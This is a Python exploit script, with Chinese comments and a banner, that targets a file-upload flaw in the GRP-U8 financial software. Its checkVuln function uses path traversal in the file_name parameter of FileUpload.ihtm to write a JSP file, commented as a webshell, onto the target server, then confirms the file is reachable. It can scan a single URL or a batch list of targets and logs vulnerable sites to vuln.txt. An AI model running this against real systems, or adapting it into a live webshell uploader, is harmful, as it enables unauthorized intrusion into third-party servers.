import sys
import requests
import argparse


# 漏洞检测模块
def checkVuln(url):
    vulnurl = url + "/app/FileUpload.ihtm?comm_type=EKING&file_name=../../test.jsp."
    okurl = url + "/test.jsp"
    data = """<% out.println("hello");%>"""  # Webshell
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6'
        }
    try:
        response = requests.get(vulnurl, headers=headers, data=data, timeout=5, verify=False)
        if response.status_code == 200:
            if 'hello' in requests.get(okurl, headers=headers, timeout=5, verify=False).text:
                print(f"【+】当前网址存在漏洞：{url}")
                with open("vuln.txt", "a+") as f:
                    f.write(okurl + "\n")
            else:
                print("【-】目标网站不存在漏洞...")

        else:
            print("【-】目标网站不存在漏洞...")
    except Exception as e:
        print("【-】目标网址存在网络链接问题...")


# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename, "r") as f:
        for readline in f.readlines():
            checkVuln(readline)


def banner():
    bannerinfo = """
    __________    __  ____         ____________
   / ____/ __ \  / / / / /        / ____/ ____/
  / /_  / / / / / /_/ / /  ______/ /_  / __/   
 / __/ / /_/ / / __  / /__/_____/ __/ / /___   
/_/    \___\_\/_/ /_/_____/    /_/   /_____/   

"""
    print(bannerinfo)
    print("YYGRP-U8".center(100, '*'))
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")


# 主程序方法，进行调用
def main():
    parser = argparse.ArgumentParser(description='GRP-U8-UploadFile漏洞单批检测脚本@xhonger')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()


if __name__ == '__main__':
    main()